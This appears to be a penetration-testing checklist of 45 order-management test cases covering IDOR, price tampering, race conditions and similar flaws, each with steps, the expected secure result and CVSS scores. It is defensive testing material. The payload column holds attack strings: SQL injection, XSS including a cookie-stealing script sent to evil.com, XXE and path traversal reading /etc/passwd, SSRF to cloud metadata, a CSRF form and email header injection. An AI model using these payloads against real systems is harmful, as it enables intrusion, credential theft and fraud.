# 6. Order Management — Checklist

Feature-area security **test cases** for “6. Order Management” — functionality-driven, impact-first with severity + CVSS.

*188 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| ORD-001 | IDOR on Order Placement for Another User | Broken Access Control (WSTG-AUTHZ-04) | Place Order | 1. Login as User A and initiate order placement. 2. Intercept the request and change user_id or account_id to User B. 3. Submit the order. 4. Check if order is placed under User B account. | Application must reject the request and only allow orders under the authenticated user's own account. | <code>Change user_id=1001 to user_id=1002 in POST /api/orders body</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-002 | Price Manipulation via Parameter Tampering | Business Logic (WSTG-BUSL-01) | Place Order | 1. Add items to cart and proceed to checkout. 2. Intercept the order submission request. 3. Modify the price or total_amount parameter to a lower value. 4. Submit the tampered request. 5. Verify if the order is accepted at the manipulated price. | Server must recalculate price server-side and reject or correct any tampered price values. | <code>Change price=99.99 to price=0.01 in POST /api/orders</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;OWASP ZAP | CWE-840; PortSwigger Business logic |
| ORD-003 | Negative Quantity in Order | Business Logic (WSTG-BUSL-01) | Place Order | 1. Add item to cart. 2. Intercept the request and change quantity to a negative value. 3. Submit the order. 4. Check if negative quantity causes credit or negative charge. | Application must validate that quantity is a positive integer and reject negative or zero values. | <code>Change quantity=1 to quantity=-5 in the order payload</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-004 | Zero Amount Order Placement | Business Logic (WSTG-BUSL-01) | Place Order | 1. Add item to cart. 2. Intercept request and set total_amount=0 or price=0. 3. Submit order. 4. Verify if a free order is processed. | Application must not allow zero-amount orders for paid products and must validate server-side. | <code>Set total_amount=0.00 or price=0 in POST body</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite | CWE-840; PortSwigger Business logic |
| ORD-005 | SQL Injection in Order Fields | Injection (WSTG-INPV-05) | Place Order | 1. Place an order and intercept the request. 2. Inject SQL payloads into fields like shipping_address or order_notes. 3. Submit and observe the response for SQL errors or data leakage. | Application must use parameterized queries and reject or sanitize malicious SQL input without exposing database errors. | <code>shipping_address=' OR 1=1--;  order_notes=1' UNION SELECT username;password FROM users--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ORD-006 | XSS in Order Fields | Cross-Site Scripting (WSTG-INPV-02) | Place Order | 1. Place an order. 2. Insert XSS payloads in fields like shipping_address or special_instructions. 3. Submit the order. 4. View the order in admin panel or order confirmation page. 5. Check if the script executes. | Application must sanitize and encode all user input to prevent script execution in any context. | <code>&lt;script&gt;alert('XSS')&lt;/script&gt; in shipping_address field</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53 |
| ORD-007 | Race Condition on Limited Stock Items | Business Logic (WSTG-BUSL-08) | Place Order | 1. Identify an item with limited stock (e.g. 1 remaining). 2. Send multiple simultaneous order requests for the same item using threading. 3. Check if multiple orders are placed exceeding available stock. | Application must implement proper locking mechanisms to prevent overselling beyond available inventory. | <code>Send 50 concurrent POST /api/orders requests with same item_id using Turbo Intruder</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Turbo Intruder;Burp Suite;Custom Scripts | CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine |
| ORD-008 | CSRF on Order Placement | CSRF (WSTG-SESS-05) | Place Order | 1. Craft a malicious HTML page with a form that auto-submits an order placement request. 2. Have an authenticated victim visit the page. 3. Check if the order is placed without the victim's explicit consent. | Application must implement and validate CSRF tokens on all state-changing operations including order placement. | <code>&lt;form action='https://target.com/api/orders' method='POST'&gt;&lt;input name='item_id' value='123'&gt;&lt;input name='quantity' value='1'&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Custom HTML | CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite |
| ORD-009 | Coupon Code Reuse and Tampering | Business Logic (WSTG-BUSL-01) | Place Order | 1. Apply a single-use coupon code to an order. 2. Complete the order. 3. Attempt to reuse the same coupon on a new order. 4. Also try modifying discount_amount parameter directly. | Application must invalidate used coupons server-side and calculate discounts on the server rather than trusting client input. | <code>Reuse coupon_code=SAVE50; tamper discount_amount=100.00 to discount_amount=999.99</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-010 | Bypassing Payment Gateway | Business Logic (WSTG-BUSL-02) | Place Order | 1. Place an order and intercept the payment callback or redirect. 2. Modify the payment_status parameter from pending to success. 3. Forward the request. 4. Check if order is confirmed without actual payment. | Application must verify payment status directly with the payment gateway server-side and not rely on client-side payment status. | <code>Change payment_status=pending to payment_status=success in callback URL or POST body</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-011 | Integer Overflow in Quantity Field | Input Validation (WSTG-INPV-01) | Place Order | 1. Place an order. 2. Set quantity to an extremely large integer value. 3. Submit and observe server behavior for overflow or unexpected pricing. | Application must validate quantity within acceptable bounds and handle large values gracefully without overflow. | <code>quantity=99999999999999999999 or quantity=2147483647</code> | Improper input validation -&gt; downstream injection / logic abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| ORD-012 | Order Placement Without Authentication | Authentication (WSTG-ATHN-01) | Place Order | 1. Capture a valid order placement request. 2. Remove the session cookie or authorization token. 3. Replay the request without authentication. 4. Check if the order is placed. | Application must require valid authentication for all order placement endpoints. | <code>Remove Cookie: session=abc123 or Authorization: Bearer token header</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ORD-013 | Mass Assignment on Order Object | Mass Assignment (WSTG-INPV-01) | Place Order | 1. Place an order with normal parameters. 2. Add additional parameters like is_paid=true or status=delivered or role=admin to the request body. 3. Submit and check if hidden fields are accepted. | Application must whitelist allowed parameters and ignore any unexpected or unauthorized fields. | <code>Add is_paid=true&amp;shipping_cost=0&amp;status=completed to POST body</code> | Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA |
| ORD-014 | Forced Browsing to Admin Order Endpoint | Broken Access Control (WSTG-AUTHZ-02) | Place Order | 1. As a regular user try accessing admin order management endpoints. 2. Try URLs like /admin/orders or /api/admin/orders/create. 3. Check if access is granted. | Application must enforce role-based access control and deny access to admin endpoints for non-admin users. | <code>GET /admin/orders; POST /api/admin/orders/create with regular user token</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;DirBuster | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-015 | HTTP Method Tampering on Order Endpoint | HTTP Methods (WSTG-CONF-06) | Place Order | 1. Send order placement request using different HTTP methods (PUT;DELETE;PATCH;OPTIONS;TRACE). 2. Check if any unintended method is accepted and processes the order or reveals information. | Application must restrict HTTP methods to only those intended and return 405 Method Not Allowed for others. | <code>Send DELETE /api/orders; PUT /api/orders; TRACE /api/orders</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-16; OWASP Security Misconfiguration (A05) |
| ORD-016 | Rate Limiting on Order Placement | Business Logic (WSTG-BUSL-05) | Place Order | 1. Send a high volume of order placement requests in rapid succession from the same account. 2. Monitor if rate limiting is enforced. 3. Check for denial-of-service or resource exhaustion. | Application must implement rate limiting on order placement to prevent abuse and resource exhaustion. | <code>Send 100+ POST /api/orders requests per minute</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;JMeter | CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| ORD-017 | Discount Stacking Abuse | Business Logic (WSTG-BUSL-01) | Place Order | 1. Apply multiple discount codes or combine discount with sale price. 2. Check if total goes below zero or if combined discounts exceed 100%. 3. Verify server-side discount validation. | Application must validate that combined discounts do not exceed allowable limits and total never goes below zero. | <code>Apply coupon_code=SAVE50 and coupon_code2=EXTRA30 together; check if total becomes negative</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-018 | XXE in Order Submission (XML-based) | Injection (WSTG-INPV-07) | Place Order | 1. If the application accepts XML order payloads intercept the request. 2. Inject an XXE payload in the order XML. 3. Submit and observe if external entities are resolved. | Application must disable external entity processing in XML parsers and reject malicious XML input. | <code>&lt;?xml version='1.0'?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;order&gt;&lt;item&gt;&amp;xxe;&lt;/item&gt;&lt;/order&gt;</code> | XXE -&gt; local file read / SSRF / OOB exfiltration. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;OWASP ZAP | CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE |
| ORD-019 | Server-Side Request Forgery via Webhook URL | SSRF (WSTG-INPV-19) | Place Order | 1. If order placement allows specifying a callback or webhook URL intercept the request. 2. Set the URL to an internal service (e.g. http://169.254.169.254/latest/meta-data/). 3. Observe the response. | Application must validate and whitelist allowed callback URLs and block internal network addresses. | <code>callback_url=http://169.254.169.254/latest/meta-data/ or callback_url=http://localhost:6379/</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| ORD-020 | Currency Manipulation in Order | Business Logic (WSTG-BUSL-01) | Place Order | 1. Place order and intercept request. 2. Change currency parameter from USD to a weaker currency. 3. Check if order is processed at manipulated currency. | Application must enforce currency on server-side and not accept client-specified currency values for pricing. | <code>Change currency=USD to currency=VND or currency=IRR while keeping same numeric amount</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-021 | IDOR on Order Confirmation Page | Broken Access Control (WSTG-AUTHZ-04) | Order Confirmation | 1. Complete an order and receive confirmation with order_id. 2. Change the order_id in the confirmation URL to another user's order_id. 3. Check if other user's order details are visible. | Application must verify that the authenticated user owns the order before displaying confirmation details. | <code>Change /order/confirmation/1001 to /order/confirmation/1002</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-022 | Information Disclosure in Confirmation Response | Information Disclosure (WSTG-INFO-05) | Order Confirmation | 1. Complete an order and inspect the confirmation response. 2. Check for sensitive data like full credit card numbers or internal user IDs or server details. 3. Review both visible page and raw response. | Application must mask sensitive data in confirmation responses showing only necessary information like last 4 digits of card. | <code>Inspect response body for fields like card_number; internal_id; server_version; debug_info</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Browser DevTools | CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ORD-023 | Email Header Injection in Confirmation Email | Injection (WSTG-INPV-11) | Order Confirmation | 1. During order placement inject email headers in the email field. 2. Check if the confirmation email is sent to additional recipients or has modified headers. | Application must sanitize email addresses and prevent header injection in all email-sending functionality. | <code>email=victim@test.com%0ACc:attacker@evil.com or email=victim@test.com\r\nBcc:attacker@evil.com</code> | CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger |
| ORD-024 | Confirmation Page Caching Sensitive Data | Caching (WSTG-ATHN-06) | Order Confirmation | 1. Complete an order and view the confirmation page. 2. Check HTTP response headers for caching directives. 3. Use browser back button or access cached page on shared computer. | Application must set Cache-Control: no-store and Pragma: no-cache headers on confirmation pages to prevent caching. | <code>Check for missing Cache-Control: no-store; Pragma: no-cache; Expires: 0 headers</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser DevTools | CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ORD-025 | XSS via Order Confirmation Details | Cross-Site Scripting (WSTG-INPV-02) | Order Confirmation | 1. Place an order with XSS payload in product name or address fields. 2. View the order confirmation page. 3. Check if the payload executes in the confirmation context. | Application must encode all output on confirmation pages to prevent XSS execution. | <code>Place order with shipping_name=&lt;img src=x onerror=alert(document.cookie)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53 |
| ORD-026 | Replay Attack on Confirmation Endpoint | Session Management (WSTG-SESS-03) | Order Confirmation | 1. Capture the order confirmation request. 2. Replay the exact same request multiple times. 3. Check if duplicate orders are created or confirmation is shown repeatedly. | Application must implement idempotency tokens to prevent duplicate order processing from replayed requests. | <code>Replay POST /api/orders/confirm with same idempotency key multiple times</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ORD-027 | Brute Force Order Confirmation ID | Broken Access Control (WSTG-AUTHZ-04) | Order Confirmation | 1. Note the format of order confirmation IDs. 2. If they are sequential enumerate nearby IDs. 3. Access confirmation pages for enumerated IDs. | Application must use non-sequential unpredictable order IDs and enforce authorization checks on all confirmation endpoints. | <code>Enumerate /order/confirmation/10001 through /order/confirmation/10100</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Intruder;ffuf | CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ORD-028 | Sensitive Data Exposure in Confirmation Email | Information Disclosure (WSTG-INFO-05) | Order Confirmation | 1. Place an order and receive confirmation email. 2. Analyze the email for sensitive data like passwords or full payment details or internal references. 3. Check if email is sent over TLS. | Confirmation email must contain only necessary information with masked sensitive data and be transmitted securely. | <code>Review email content for plain-text passwords; full card numbers; internal system identifiers</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Email Client;Burp Suite | CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ORD-029 | IDOR on Order History Access | Broken Access Control (WSTG-AUTHZ-04) | Order History | 1. Login as User A and access order history. 2. Intercept the API call and change user_id to User B. 3. Check if User B's order history is returned. | Application must only return order history belonging to the authenticated user regardless of parameter manipulation. | <code>Change GET /api/orders?user_id=1001 to user_id=1002</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-030 | Insecure Direct Object Reference on Individual Order | Broken Access Control (WSTG-AUTHZ-04) | Order History | 1. Access a specific order from history via order_id. 2. Modify the order_id to access another user's order. 3. Check if unauthorized order details are disclosed. | Application must verify ownership of each order before returning its details. | <code>Change GET /api/orders/ORD-1001 to GET /api/orders/ORD-1002</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-031 | Order History Data Leakage via API Response | Information Disclosure (WSTG-INFO-05) | Order History | 1. Request order history via API. 2. Inspect the JSON response for excessive data like other users' details or internal fields. 3. Check for verbose error messages. | API must return only the minimum necessary fields for the authenticated user's orders without excessive data exposure. | <code>Look for fields like internal_notes; admin_comments; other_user_email; debug_data in response</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ORD-032 | SQL Injection in Order History Search/Filter | Injection (WSTG-INPV-05) | Order History | 1. Use the order history search or filter functionality. 2. Inject SQL payloads in search parameters like order_id or date_range or status. 3. Observe the response. | Application must use parameterized queries and properly validate all filter and search inputs. | <code>GET /api/orders?status=' OR '1'='1; GET /api/orders?search=1' UNION SELECT &#42; FROM users--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ORD-033 | Unauthorized Access to Order History Without Auth | Authentication (WSTG-ATHN-01) | Order History | 1. Capture the order history API request. 2. Remove authentication headers or cookies. 3. Send the request and check if order history is returned without authentication. | Application must require valid authentication for all order history endpoints. | <code>Remove Authorization header from GET /api/orders/history</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ORD-034 | Pagination Bypass to Dump All Orders | Broken Access Control (WSTG-BUSL-01) | Order History | 1. Access order history with pagination. 2. Modify page_size or limit parameter to an extremely large value. 3. Check if all orders including other users' orders are returned. | Application must enforce maximum page size limits and ensure pagination only returns the authenticated user's orders. | <code>Change GET /api/orders?page=1&amp;limit=10 to limit=999999 or page_size=100000</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-035 | Horizontal Privilege Escalation via Order History | Broken Access Control (WSTG-AUTHZ-02) | Order History | 1. As a regular user access order history endpoints meant for admin or support staff. 2. Try endpoints like /api/admin/orders/all or /api/support/orders. 3. Check access. | Application must enforce role-based access control preventing regular users from accessing admin order views. | <code>GET /api/admin/orders; GET /api/all-orders; GET /api/orders/export with regular user credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;DirBuster | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-036 | XSS via Stored Order Data in History View | Cross-Site Scripting (WSTG-INPV-02) | Order History | 1. Place an order with XSS payload in product name or address or notes. 2. Navigate to order history page. 3. Check if the stored payload executes when viewing order history. | Application must properly encode all stored data when rendering order history to prevent stored XSS. | <code>View order history containing orders with &lt;svg/onload=alert(1)&gt; in shipping_address</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53 |
| ORD-037 | Export/Download Order History Path Traversal | Path Traversal (WSTG-INPV-10) | Order History | 1. Use the order history export or download feature. 2. Intercept the request and modify the file path parameter. 3. Attempt to read arbitrary files from the server. | Application must validate file paths and restrict file access to authorized directories only. | <code>GET /api/orders/export?file=../../../etc/passwd or file=....//....//etc/passwd</code> | Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai |
| ORD-038 | IDOR on Order Tracking | Broken Access Control (WSTG-AUTHZ-04) | Order Tracking | 1. Track an order using tracking_id or order_id. 2. Modify the ID to another user's order. 3. Check if tracking information for another user's order is displayed. | Application must verify that the requesting user owns the order before displaying tracking details. | <code>Change GET /api/orders/track/TRK-1001 to TRK-1002</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-039 | Enumeration of Tracking Numbers | Information Disclosure (WSTG-INFO-04) | Order Tracking | 1. Note the format of tracking numbers. 2. Enumerate sequential or predictable tracking numbers. 3. Check if tracking details are returned for enumerated IDs without proper auth. | Application must use non-predictable tracking identifiers and require authentication or ownership verification. | <code>Enumerate TRK-00001 to TRK-99999 using Burp Intruder</code> | Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Intruder;ffuf | CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04 |
| ORD-040 | SQL Injection in Tracking Number Search | Injection (WSTG-INPV-05) | Order Tracking | 1. Enter a tracking number in the search field. 2. Inject SQL payloads in the tracking_id parameter. 3. Observe the response for SQL errors or data extraction. | Application must use parameterized queries for tracking number lookups. | <code>GET /api/track?tracking_id=' OR 1=1-- or tracking_id=1' UNION SELECT table_name FROM information_schema.tables--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ORD-041 | XSS in Tracking Status Display | Cross-Site Scripting (WSTG-INPV-02) | Order Tracking | 1. If tracking status can be updated by seller or admin inject XSS payload in status message. 2. View the tracking page as the buyer. 3. Check if the payload executes. | Application must encode all tracking status messages and updates before rendering to prevent XSS. | <code>status_message=&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53 |
| ORD-042 | Unauthorized Tracking Status Modification | Broken Access Control (WSTG-AUTHZ-02) | Order Tracking | 1. As a regular user attempt to send a PUT or PATCH request to update tracking status. 2. Try to change status from shipped to delivered. 3. Check if modification is accepted. | Application must restrict tracking status updates to authorized roles only such as admin or logistics personnel. | <code>PUT /api/orders/track/TRK-1001 with body status=delivered using regular user token</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-043 | Tracking Page Open Redirect | Open Redirect (WSTG-CLNT-04) | Order Tracking | 1. Check if the tracking page has any redirect parameters. 2. Modify the redirect URL to an external malicious site. 3. Check if the user is redirected. | Application must validate redirect URLs against a whitelist and prevent redirects to external domains. | <code>GET /api/track?tracking_id=TRK-1001&amp;redirect=https://evil.com</code> | Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Suite;Browser | CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; PayloadsAllTheThings |
| ORD-044 | SSRF via Tracking Webhook URL | SSRF (WSTG-INPV-19) | Order Tracking | 1. If tracking allows setting webhook or callback URLs for status updates intercept the request. 2. Set URL to internal services. 3. Check for SSRF. | Application must validate webhook URLs against allowlists and block internal network addresses. | <code>webhook_url=http://127.0.0.1:8080/admin or http://169.254.169.254/latest/meta-data/</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| ORD-045 | Sensitive Location Data Exposure in Tracking | Information Disclosure (WSTG-INFO-05) | Order Tracking | 1. Access tracking details via API. 2. Check if response includes exact GPS coordinates or detailed courier location or customer's precise address to unauthorized parties. | Application must limit location precision based on user role and not expose exact coordinates to unauthorized users. | <code>Inspect response for fields like courier_gps_lat; courier_gps_lng; exact_delivery_coordinates</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
